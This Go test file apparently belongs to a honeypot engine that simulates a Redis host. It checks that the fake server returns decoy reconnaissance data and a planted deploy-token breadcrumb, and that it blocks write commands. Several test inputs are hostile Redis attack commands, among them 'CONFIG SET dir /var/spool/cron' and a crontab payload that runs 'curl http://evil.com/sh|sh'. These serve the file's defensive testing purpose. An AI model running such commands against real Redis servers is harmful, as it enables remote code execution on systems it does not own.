package engine

import (
	"strings"
	"testing"

	"github.com/alterhive/alterhive/internal/domain"
)

// TestRedisConfigGetDir verifies CONFIG GET dir/dbfilename returns redis
// reconnaissance data (architecture §23.4).
func TestRedisConfigGetDir(t *testing.T) {
	topology := domain.NewVirtualTopology(domain.TopologyConfig{
		CIDR:    "192.168.56.0/24",
		Gateway: "192.168.56.1",
		LocalIP: "192.168.56.23",
		Hosts: []domain.VirtualHost{
			{IP: "192.168.56.30", Hostname: "redis-01", Role: "cache", OS: "Ubuntu 22.04",
				Services: []domain.VirtualService{{Port: 6379, Protocol: "redis", NmapName: "redis"}}},
		},
	})
	session := domain.NewSessionContext("root", "127.0.0.1:0")
	out, hits := handleRedisCommand("redis-cli -h 192.168.56.30 CONFIG GET dir", session, topology, true)
	if !strings.Contains(out, "/var/lib/redis") {
		t.Fatalf("expected redis dir in CONFIG GET, got: %q", out)
	}
	if !strings.Contains(out, "dump.rdb") {
		t.Fatalf("expected dbfilename in CONFIG GET, got: %q", out)
	}
	_ = hits
}

// TestRedisConfigSetBlocked verifies CONFIG SET is denied (architecture §23.4).
func TestRedisConfigSetBlocked(t *testing.T) {
	topology := domain.NewVirtualTopology(domain.TopologyConfig{
		CIDR: "192.168.56.0/24", Gateway: "192.168.56.1", LocalIP: "192.168.56.23",
		Hosts: []domain.VirtualHost{
			{IP: "192.168.56.30", Hostname: "redis-01", Role: "cache", OS: "Ubuntu 22.04",
				Services: []domain.VirtualService{{Port: 6379, Protocol: "redis", NmapName: "redis"}}},
		},
	})
	session := domain.NewSessionContext("root", "127.0.0.1:0")
	out, _ := handleRedisCommand("redis-cli -h 192.168.56.30 CONFIG SET dir /var/spool/cron", session, topology, true)
	if !strings.Contains(out, "Permission denied") {
		t.Fatalf("expected CONFIG SET to be blocked, got: %q", out)
	}
}

// TestRedisSaveBlocked verifies SAVE/BGSAVE is denied (architecture §23.4).
func TestRedisSaveBlocked(t *testing.T) {
	topology := domain.NewVirtualTopology(domain.TopologyConfig{
		CIDR: "192.168.56.0/24", Gateway: "192.168.56.1", LocalIP: "192.168.56.23",
		Hosts: []domain.VirtualHost{
			{IP: "192.168.56.30", Hostname: "redis-01", Role: "cache", OS: "Ubuntu 22.04",
				Services: []domain.VirtualService{{Port: 6379, Protocol: "redis", NmapName: "redis"}}},
		},
	})
	session := domain.NewSessionContext("root", "127.0.0.1:0")
	out, _ := handleRedisCommand("redis-cli -h 192.168.56.30 SAVE", session, topology, true)
	if !strings.Contains(out, "Permission denied") && !strings.Contains(out, "failed") {
		t.Fatalf("expected SAVE to be blocked, got: %q", out)
	}
}

// TestRedisGetDeployToken verifies GET returns breadcrumb credentials
// that are consistent with the SecretGraph (architecture §24.5).
func TestRedisGetDeployToken(t *testing.T) {
	topology := domain.NewVirtualTopology(domain.TopologyConfig{
		CIDR: "192.168.56.0/24", Gateway: "192.168.56.1", LocalIP: "192.168.56.23",
		Hosts: []domain.VirtualHost{
			{IP: "192.168.56.30", Hostname: "redis-01", Role: "cache", OS: "Ubuntu 22.04",
				Services: []domain.VirtualService{{Port: 6379, Protocol: "redis", NmapName: "redis"}}},
		},
	})
	session := domain.NewSessionContext("root", "127.0.0.1:0")
	out, _ := handleRedisCommand("redis-cli -h 192.168.56.30 GET deploy:token", session, topology, true)
	if !strings.Contains(out, "glpat-"+domain.DeploySeed) {
		t.Fatalf("expected deploy token breadcrumb, got: %q", out)
	}
}

// TestRedisSetBlocked verifies SET is denied as read-only replica.
func TestRedisSetBlocked(t *testing.T) {
	topology := domain.NewVirtualTopology(domain.TopologyConfig{
		CIDR: "192.168.56.0/24", Gateway: "192.168.56.1", LocalIP: "192.168.56.23",
		Hosts: []domain.VirtualHost{
			{IP: "192.168.56.30", Hostname: "redis-01", Role: "cache", OS: "Ubuntu 22.04",
				Services: []domain.VirtualService{{Port: 6379, Protocol: "redis", NmapName: "redis"}}},
		},
	})
	session := domain.NewSessionContext("root", "127.0.0.1:0")
	out, _ := handleRedisCommand("redis-cli -h 192.168.56.30 SET crontab '*/1 * * * * curl http://evil.com/sh|sh'", session, topology, true)
	if !strings.Contains(out, "READONLY") && !strings.Contains(out, "read only") {
		t.Fatalf("expected SET to be blocked as read-only, got: %q", out)
	}
}
